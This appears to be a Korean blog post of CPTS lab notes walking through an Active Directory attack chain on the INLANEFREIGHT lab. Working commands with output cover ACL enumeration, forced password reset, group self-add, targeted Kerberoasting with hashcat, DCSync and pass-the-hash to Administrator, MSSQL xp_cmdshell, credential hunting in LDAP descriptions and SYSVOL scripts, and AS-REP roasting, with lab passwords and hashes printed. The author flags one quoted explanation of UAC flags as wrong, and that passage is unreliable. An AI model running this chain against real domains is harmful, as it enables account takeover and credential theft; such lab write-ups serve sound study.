---
title: "Active Directory - ACL Abuse, Privileged Access and Misconfigurations"
date: 2026-08-06
layout: single
excerpt: "Windows 환경에서 파일, 브라우저, 레지스트리, 저장된 세션, 백업, 클립보드 등을 통해 자격 증명을 수집하고, 사용자 상호작용 및 다양한 추가 기법을 활용해 권한 상승과 횡적 이동으로 이어지는 공격 흐름을 실습한다."
author_profile: true
toc: true
toc_label: "Active Directory"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [windows, cpts, priv-esc, credential-theft, pillaging, lateral-movement, registry, browser-credentials, scheduled-tasks]
---

# An ACE in the Hole

## ACL Enumeration

이제 엑티브 디렉토리에선 acl같은게 있다.

이건 각 객체마다 그 객체에 해당하는 사람의 권한을 볼수있는 그런것이다.

acl 객체를 확인할수있는 방법은 여러가지지만 일단 파워뷰가 존재한다.

전 모듈에서의 wley 유저를 기준으로 파워뷰를 열거해보겠다.

우선 sid를 wley 유저로 맞추어 설정하였따:

```powershell
PS C:\Users\htb-student> $sid = Convert-NameToSid wley
```

우선 wley에게 어떤 대상과 어떤 권한이 연결되어있는지 확인할수있다:

```powershell
PS C:\Users\htb-student> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AceType                : AccessAllowedObject
AceFlags               : ContainerInherit
IsInherited            : False
InheritanceFlags       : ContainerInherit
PropagationFlags       : None
AuditFlags             : None
```

이처럼 Dana Amundsen 에 관련된 현재 값이 `00299570-246d-11d0-a768-00aa006e0529` 임을 확인하였따.

이 값을 확인하기 위하여 [](https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password) 같은웹사이트를 통해 확인하거나 아래 방법을 통하여 확인할수있따:

```powershell
PS C:\Users\htb-student> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
```

이처럼 현재 저 값은 User-Force-Change-Password 권한이였다.

추가로 만약 모든 유저를 대상으로 열거를 수행하고싶을수가있다.

따라서 doamin과 연관된 user들을 txt 파일로 저장한뒤에 해당하는 유저를 기준으로 브루트포싱처럼 열거할수잇다.

우선 user로 저장할수있따:

```powershell
PS C:\Users\htb-student> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

이처럼 저장된 값들을 `ad_users.txt` 로 저장후 순차적으로 열거할수있따:

```powershell
PS C:\Users\htb-student> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana 
                        Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
InheritanceType       : All
ObjectType            : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : INLANEFREIGHT\wley
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
```

만약 Dana Amundsen 계정 권한 기준으로 비번을 바꾼뒤에 Dana Amundsen 권한을획득했다고 치자. 

그 Dana Amundsen에 관련된 연결되어있는 유저들을 살펴볼수있따:

```powershell
PS C:\Users\htb-student> $sid2 = Convert-NameToSid damundsen
PS C:\Users\htb-student> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
AccessMask            : 131132
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

Get-DomainGroup을 사용하여 헬프 데스크 레벨 1 그룹 조사하기:

```powershell
PS C:\Users\htb-student> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

memberof                                                                      
--------                                                                      
CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

이처럼 cn이 Information Technology임을 확인하였다.

이걸 바탕으로 또 Information Technology cn에 대하여 열거를 수행할수있다:

```powershell
PS C:\Users\htb-student> $itgroupsid = Convert-NameToSid "Information Technology"
PS C:\Users\htb-student> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

이렇게 Angela Dunn 유저에 관련하여 GenericAll 권한이 주어져있음을 확인할수있따.

여기서 중요한점.Angela Dunn 권한엔 이런게 존재한다:

```powershell
PS C:\htb> $adunnsid = Convert-NameToSid adunn 
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

# SKIP
```

이 계정은 `DS-Replication-Get-Changes` 일명 DCSync 권한이 존재하였따.

우선 위의 관계는 이러하다 Dana Amundsen 유저를 이용하여 헬프데스크에 들어간뒤. 헬프데스크에선 Information Technology 라는 그룹 맴버에 자동으로 포함시키고 Information Technology 맴버에겐 adunn의 악용권한이 존재하는것이다.

이처럼 파워뷰를 활용하여 열거하는 반면, 블러드 하운드를 통하여 수행할수잇따.

## ACL Abuse Tactics

다 알아서 뒤지게 귀찮은데 일단 해볼것이다.

rdp가 뒤지게 불편해서 포트포워딩을 통해 내 환경에서 수행한다는 점 이해바람

위 섹션에서 봤다시피 Dana Amundsen 에 대하여 패스워드 변경이 존재하였다(여기선 걍 정보만 보여주겠다):

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u wley -p 'transporter@4' get object damundsen --attr distinguishedName,sAMAccountName

distinguishedName: CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
sAMAccountName: damundsen
```

대충 다시 보여준다면 이러하다:

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u wley -p 'transporter@4' get object damundsen --attr nTSecurityDescriptor --resolve-sd | grep -A2 'Trustee: wley'          

nTSecurityDescriptor.ACL.2.Trustee: wley
nTSecurityDescriptor.ACL.2.Right: CONTROL_ACCESS
nTSecurityDescriptor.ACL.2.ObjectType: User-Force-Change-Password
```

이를 토대로 Dana Amundsen 유저 일명 damundsen 친구의 비번을 변경할것이다.

우선 damundsen친구의 비번을 변경하였따:

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u wley -p 'transporter@4' set password damundsen 'Asdf1234@' 

[+] Password changed successfully!
```
이제 됐으니 위 유저로 인증해보자:

```bash
$ proxychains nxc ldap 172.16.5.5 -u damundsen -p 'Asdf1234@'                                            

LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL)
LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\damundsen:Asdf1234@
```

이처럼 정상적으로 변경에 성공하였따.

이제 위에서 봤다시피 헬프데스크 그룹에 쓰기권한이 존재한다.

따라서 헬프데스크 그룹에 대해서 자기도 그 권한에 들어갔다:

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u damundsen -p 'Asdf1234@' add groupMember 'Help Desk Level 1' damundsen          

[+] damundsen added to Help Desk Level 1
```

이처럼 정상적으로 넣었으며 Help Desk Level 1 의 그룹 맴버를 보게되면 잘 들어갔음을 확인할수있따:

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u damundsen -p 'Asdf1234@' get object 'Help Desk Level 1' --attr member

# SKIP

CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL;
```

그리고 위처럼 Help Desk Level 1 그룹은 Information Technology 그룹에 재귀적으로 속하게 된다.

따라서 현재 damundsen 유저는 adunn 유저를 수정할수 있는 권한이 있다.

따라서 켈베로스팅을 위해 damundsen를 이용하여 adunn유저의 spn을 설정하였다:

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u damundsen -p 'Asdf1234@' set object adunn servicePrincipalName -v 'abc/abc'

[+] adunn's servicePrincipalName has been updated
```

이후 getuserspn을 활용하여 adunn유저의 해시를 가져왔다:

```bash
$ proxychains impacket-GetUserSPNs INLANEFREIGHT.LOCAL/wley:'transporter@4' -dc-ip 172.16.5.5 -request-user adunn 

ServicePrincipalName  Name   MemberOf                                                           PasswordLastSet             LastLogon                   Delegation 
--------------------  -----  -----------------------------------------------------------------  --------------------------  --------------------------  ----------
abc/abc               adunn  CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  2022-03-01 14:29:08.246680  2022-03-02 15:12:58.114176             

[-] CCache file is not found. Skipping...

$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/adunn*$0fa8c346a06b93bd10296f8d980f347b$c95a376f9e137328f908a9654e21e240bfd0549a5d7486237dad10dec6828960d8ca1981bd91cbddb0ef444a2e010b5ec2236c13a8f32f7dd1bb9afa8b3414f260e3c1cbba8beda02dedae393caaf134d7be15ff2c3491c00523765149aae9586af75ca40a86df285bc648488ae1cb4481ee21aa6c08a4296b84b7a56d951acc05223c7d61146fb3e8cdfe36bbb0763496976bde871dfc3346f2fddd04cb118fca209a7cd142e8b1bbd4b552c24f61d9beb130ec49960f9ab8c04fbc12dbb815992a0134189dd11641dd5d55d697df8336edb4d9e6cb448317d2ecf8c427c9a87e37e3b4a8ca57192087beb57216b1120a1e30b4b307c752f628962db7217aeb6a5c6b4ed84cb4741c663aee6c0f7fadfc8bb111f2e7557396ddade1bb81e4b350c6b2725341905dede8bff832c7453f48f2075f38d06a3d50dcde93693cf924d96dbf8c80c06dc3f2716d9216fbcfeaf53a3ab8db50a2b63ea7c4d451911928d0dac475ed53e567fedb24443da9ae1a1ce5f3173451d1004735f51913c4ea5dd60738e62e46b8227fba95ca62b86e107dbb4094e14c0de00c0bd5649d024433cd571de8864bd7257af1cbd21f6c10e15e916e33fdad92b222f7d3e4311a198ba207584f8d8038461e776e4962d11b234e7a914d7787a181c3f580354fbf66484df1a7c4532384fdd2aacb6f9d48396b9e33fceb3f5df699b13d29f46801478152284aedd928a4dc0955172be6cd23160d4215171ecb0b18db62d8b2b45f262a2cff4b6b2b25f2d8b4c29504fbde5de081cabf470a5c12caca966cd37e4c20c121a2c8148d633a4a00ec75de9ee4fa50c8fe8be3f4dabe7a3b104e8e17d1ac7387e07ada121a691b024f5a59477643f481761e43116f800be2ca99c2b20425e518ce9f90a8c453c1adbe8b67fafa1ac6f2e688e859fe27ec27ffa4356d1e4c36d322414194eb96f912b004db041ae772d017f2d5417b4df6dae5c45115e5e2df64211f7fd72a1f917b969e9c9e2415b23f7d9dcb0e017468c1f28fc974e189e037b7414cfbc0c3fab2140d5df2bf346d43e0c5c4388a3b6f2049e64034a41f4a44cb4a8435ea0b8f90056320ccbb1151f6df7b8d2ca29620fccd0cfd5283e1d55eb5a0d941b160a6f89b448f1f809f562b7559039e402a0f9fb03aff7fb1ac0e64d889c8b71fe2b2ae98e9f45d538119198d000fb6fd7895051ea742dd26096b6edffa959c2b8db5c868f03864cf5c20c4bfea329cc9af632a34716356f10f7c73f411fd7cfa37099d375d8f352971f4ae1e92e678fd43efc87f41b22db3a338b60b41c2336507c325e477b24c26d4b51dfb80f897e1b73fd5281461dc4663c27f0c82827123528fce3b781065a78d65a4c459d075f9b18467ade297eebfb4cf3a0945ee54d336086e2a3c12a79a9f96f408343a91b27fed59cc35fcda72984845c2bd738e1f6d28
```

이처럼 해시를 가져와 크랙하였다:

```bash
hashcat -m 13100 '$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/adunn*$0fa8c346a06b93bd10296f8d980f347b$c95a376f9e137328f908a9654e21e240bfd0549a5d7486237dad10dec6828960d8ca1981bd91cbddb0ef444a2e010b5ec2236c13a8f32f7dd1bb9afa8b3414f260e3c1cbba8beda02dedae393caaf134d7be15ff2c3491c00523765149aae9586af75ca40a86df285bc648488ae1cb4481ee21aa6c08a4296b84b7a56d951acc05223c7d61146fb3e8cdfe36bbb0763496976bde871dfc3346f2fddd04cb118fca209a7cd142e8b1bbd4b552c24f61d9beb130ec49960f9ab8c04fbc12dbb815992a0134189dd11641dd5d55d697df8336edb4d9e6cb448317d2ecf8c427c9a87e37e3b4a8ca57192087beb57216b1120a1e30b4b307c752f628962db7217aeb6a5c6b4ed84cb4741c663aee6c0f7fadfc8bb111f2e7557396ddade1bb81e4b350c6b2725341905dede8bff832c7453f48f2075f38d06a3d50dcde93693cf924d96dbf8c80c06dc3f2716d9216fbcfeaf53a3ab8db50a2b63ea7c4d451911928d0dac475ed53e567fedb24443da9ae1a1ce5f3173451d1004735f51913c4ea5dd60738e62e46b8227fba95ca62b86e107dbb4094e14c0de00c0bd5649d024433cd571de8864bd7257af1cbd21f6c10e15e916e33fdad92b222f7d3e4311a198ba207584f8d8038461e776e4962d11b234e7a914d7787a181c3f580354fbf66484df1a7c4532384fdd2aacb6f9d48396b9e33fceb3f5df699b13d29f46801478152284aedd928a4dc0955172be6cd23160d4215171ecb0b18db62d8b2b45f262a2cff4b6b2b25f2d8b4c29504fbde5de081cabf470a5c12caca966cd37e4c20c121a2c8148d633a4a00ec75de9ee4fa50c8fe8be3f4dabe7a3b104e8e17d1ac7387e07ada121a691b024f5a59477643f481761e43116f800be2ca99c2b20425e518ce9f90a8c453c1adbe8b67fafa1ac6f2e688e859fe27ec27ffa4356d1e4c36d322414194eb96f912b004db041ae772d017f2d5417b4df6dae5c45115e5e2df64211f7fd72a1f917b969e9c9e2415b23f7d9dcb0e017468c1f28fc974e189e037b7414cfbc0c3fab2140d5df2bf346d43e0c5c4388a3b6f2049e64034a41f4a44cb4a8435ea0b8f90056320ccbb1151f6df7b8d2ca29620fccd0cfd5283e1d55eb5a0d941b160a6f89b448f1f809f562b7559039e402a0f9fb03aff7fb1ac0e64d889c8b71fe2b2ae98e9f45d538119198d000fb6fd7895051ea742dd26096b6edffa959c2b8db5c868f03864cf5c20c4bfea329cc9af632a34716356f10f7c73f411fd7cfa37099d375d8f352971f4ae1e92e678fd43efc87f41b22db3a338b60b41c2336507c325e477b24c26d4b51dfb80f897e1b73fd5281461dc4663c27f0c82827123528fce3b781065a78d65a4c459d075f9b18467ade297eebfb4cf3a0945ee54d336086e2a3c12a79a9f96f408343a91b27fed59cc35fcda72984845c2bd738e1f6d28' /usr/share/wordlists/rockyou.txt
```

그 결과 이처럼 크랙을 하는데 성공하였다:

```text
SyncMaster757
```

그리고 이는 DC를 복제하는 권한이 주어져있었으며 DCSYNC 권한을 통하여 secretdump를 이용해 ntlm을 따내어 관리자에 들어갈수있따.

테스트해보니 이처럼 됐다:

```bash
$ proxychains nxc ldap 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL)
LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator:88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

# Stacking The Deck 

## Privileged Access

방금처럼 dc에 권한을 얻었다.

근데 damundsen 이친구의 블러드하운드를 자세히 살펴보니 이러한 권한이 주어져있었다:

![Active Directory](/assets/cpts-infra/active-directory-acl-abuse-privileged-access-and-misconfigurations/ad1.png)

현재 damundsen 친구는 어떤 컴퓨터의 대해서 SQLAdmin 이란 권한이 존재하였다.

따라서 저 컴퓨터는 sql 관련 서비스임을 인지할수있따.

따라서 저 sid를 검색하였다:

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u damundsen -p 'Asdf1234@' get object 'S-1-5-21-3842939050-3880317879-2865463114-5631' --attr objectSid,sAMAccountName

distinguishedName: CN=ACADEMY-EA-DB01,OU=Database,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
objectSid: S-1-5-21-3842939050-3880317879-2865463114-5631
sAMAccountName: ACADEMY-EA-DB01$
```

이처럼 현재 sqladmin에 속한 계정은 `ACADEMY-EA-DB01$` 컴퓨터 계정임을 알수있다.

위 컴터 계정의 대한 ip를 검색하였따:

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u damundsen -p 'Asdf1234@' msldap dnsquery 'ACADEMY-EA-DB01' --zone INLANEFREIGHT.LOCAL

Tree: DC=INLANEFREIGHT.LOCAL,CN=MicrosoftDNS,DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL
0400010005f0000059010000000004b0000000003b573800ac100596
==== DNS_RECORD ====
DataLength: 4
Type: A
Version: 05
Rank: 240
Flags: 0000
Serial: 345
TtlSeconds: 1200
Reserved: 00000000
TimeStamp: 3b573800
Data: ac100596

{'IpAddress': '172.16.5.150'}
```

그 결과 이처럼 `172.16.5.150` 에 해당한다고 적혀있다.

따라서 프록시 체인을 걸쳐 172.16.5.150 서버의 db 로 들어갈수있게된다:

```bash
$ proxychains impacket-mssqlclient damundsen@172.16.5.150 -windows-auth
Password: Asdf1234@

SQL (INLANEFREIGHT\damundsen  dbo@master)>
```

셸을 키고 보게되면 이처럼 저런 권한이 나오게된다:

```bash
SQL (INLANEFREIGHT\damundsen  dbo@master)> enable_xp_cmdshell
INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.

SQL (INLANEFREIGHT\damundsen  dbo@master)> xp_cmdshell "whoami /priv"

PRIVILEGES INFORMATION                                                             
----------------------                                                             
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled  
```

따라서 SeImpersonatePrivilege  저걸 활용해 시스템으로 들어갈수있는 그런 수단이 존재하게된다.

## Miscellaneous Misconfigurations

내부에서는 귀찮아서 비밀번호 입력을 대충한 사람도 존재한다.

특히 Description 부분에 자격증명을 적어놓는 경우가 허다하다.

우선 현재 내부 ssh 발급된 계정엔 구시대적인 툴밖에어ㅏㅄ기에 포워딩해서 진행한다.

이처럼 디크립션에 비밀번호가 존재할수있다:

```bash
$ proxychains nxc ldap 172.16.5.5 -u wley -p 'transporter@4' --users | awk '$1=="LDAP" && $6 ~ /^[0-9]{4}-/ && NF>8'

LDAP                     172.16.5.5      389    ACADEMY-EA-DC01  administrator                 2021-10-27 10:49:32 1        Built-in account for administering the computer/domain
LDAP                     172.16.5.5      389    ACADEMY-EA-DC01  krbtgt                        2021-10-27 11:14:34 0        Key Distribution Center Service Account
LDAP                     172.16.5.5      389    ACADEMY-EA-DC01  bross                         2021-10-27 13:37:07 3        HTB{LD@P_I$_W1ld}
LDAP                     172.16.5.5      389    ACADEMY-EA-DC01  ldap.agent                    2021-10-28 21:14:08 1        *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

또한 smb에 자격증명이 존재할수도 있다.

smb에 share를 통하여 봐보았다:

```bash
$ proxychains nxc smb 172.16.5.5 -u wley -p 'transporter@4' --shares                                             

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\wley:transporter@4 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Enumerated shares
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark
SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin
SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            
SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC
SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ            Logon server share 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  User Shares     READ            
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ZZZ_archive     READ 
```

이중 script가 실행되는 gpt 설정이 존재하는 sysvol에 read 권한이있다.

sysvol의 script 관련으로 들어가보았다:

```text
smb: \INLANEFREIGHT.LOCAL\scripts\> ls
  .                                   D        0  Tue Mar  8 17:56:31 2022
  ..                                  D        0  Tue Mar  8 17:56:31 2022
  daily-runs.zip                      A      174  Thu Nov 18 13:44:59 2021
  disable-nbtns.ps1                   A      203  Tue Mar  1 00:11:55 2022
  Logon Banner.htm                    A   144138  Mon Mar  7 12:41:55 2022
  reset_local_admin_pass.vbs          A      979  Tue Mar  8 17:56:24 2022
```

이처럼 script에 여러 파일들이 존재하면서 특히 ` reset_local_admin_pass.vbs` 이 파일이 존재한다.

따라서 위 파일을 다운로드하였다.

다운로드 한 후 내부 파일을 보면 이러하다:

```text
On Error Resume Next
strComputer = "."
 
Set oShell = CreateObject("WScript.Shell") 
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
 
Set Arg = WScript.Arguments
If  Arg.Count > 0 Then
sPwd = Arg(0) 'Pass the password as parameter to the script
End if
```

이처럼 자격증명이 존재하게 된다.

또한 DONT_REQ_PREAUTH 플래그가 켜지있는 사용자도 볼수있다.

저 플래그가 켜져있으면 사전 인증 요구 안하기에 AS-REP Roasting 공격이 가능해진다.

getnpusers를 활용하여 보게되면 다음과 같다:

```bash
$ proxychains impacket-GetNPUsers 'inlanefreight.local/wley:transporter@4' -dc-ip 172.16.5.5

Name     MemberOf                                                           PasswordLastSet             LastLogon                   UAC      
-------  -----------------------------------------------------------------  --------------------------  --------------------------  --------
mmorgan  CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  2022-04-05 15:34:54.924573  2022-03-10 14:48:06.096160  0x410200 
ygroce   CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  2022-04-05 15:34:43.283941  <never>                     0x410220
```

이처럼 UAC가 0x410220가 켜져있는걸 확인할수있다.

"
0x410220값은 해당 계정에 TRUSTED_FOR_DELEGATION, DONT_EXPIRE_PASSWORD, NORMAL_ACCOUNT 등의 플래그가 조합되어 있는것이다.

각 조합 권한은 이러하다:

- NORMAL_ACCOUNT (0x0200): 일반적인 사용자 계정
- DONT_EXPIRE_PASSWORD (0x10000): 암호가 만료되지 않도록 설정
- TRUSTED_FOR_DELEGATION (0x80000): 계정이 위임(Delegation)에 신뢰되어 있어, Kerberos 인증 시 서비스가 사용자의 TGT(Ticket Granting Ticket)를 캐시하거나 재사용할 수 있음.
"

쌍따옴표 안엔 틀린내용이니까 GPT 수정좀 ㄱㄱ

무튼 이렇게해서 KERBERO 인증이 필요없기에 사용자 SPN 달린거마냥 mmorgen또는 ygroce 계정의 해시를 가져올수잇따.

```bash
$ proxychains impacket-GetNPUsers 'inlanefreight.local/wley:transporter@4' -dc-ip 172.16.5.5 -request

Name     MemberOf                                                           PasswordLastSet             LastLogon                   UAC      
-------  -----------------------------------------------------------------  --------------------------  --------------------------  --------
mmorgan  CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  2022-04-05 15:34:54.924573  2022-03-10 14:48:06.096160  0x410200 
ygroce   CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  2022-04-05 15:34:43.283941  <never>                     0x410220 

$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:013b6fb87a83596f4d638f5cc193049c$02d69d5371ad4a7af3fff8949b8ff0775e562f83fff5e91bfc611487dc92419975556fd8fe169454530fdb21b593731140fc7f9de311a146cca0d5bb495f3eb7dad26f0b618236f7564ec53e7735476a18e87ff53c072e9cb82937bbfaab8463584463958905b7c3f39b0bb316fb12683cc0c7e917415af565cf6f617203065e8f0cba4832889651d557e9d568a0861661c724e97437a7e1c40fedfb32b65690e00c373e502954999a47b58e12e2ab88d9b232be71a09a2cd5bbc36757bd8db5885c942d486f6f226aea61389a72198f41caf2ea97bb64a1d6f80f3dcb2fcbfa15035e15f0118f1f039e817d6cfef66c0fc579edc0292821c34f

$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:a245c4540f0a994e66620e32afbe8480$9320954e41acec4912f6122f6870990fef3c98a4dc2a6db1fe1cf42225a3c13aee4865df560eb65b626ffc482e4ac15d770623bc7fad2fd65477ed5e9359c8304dbe5e180157a5a78adc7975db3140996a45bb1c14cfa8f83d03d321ed2cd7180b17ad7d7977b8070044e740512ef0842ee2c9d7f1f1bdce609d06b68af2f1bdc43a4db30fc3259cca81dc867aadccd9ceb5f5d124566c1382e2f779c96ab7c281ffce2fbfe37137024207cb31a573616271d28c234d5fe0be240ec511b9abb0e650a79a4fc840a4d96ed15478864cbdd208d024f9fe9cbba8fcf8d7bcc03ff3f13c1bdfc3cb07faf5c8d31827ec1f7865db01ea1b22dcea020f
```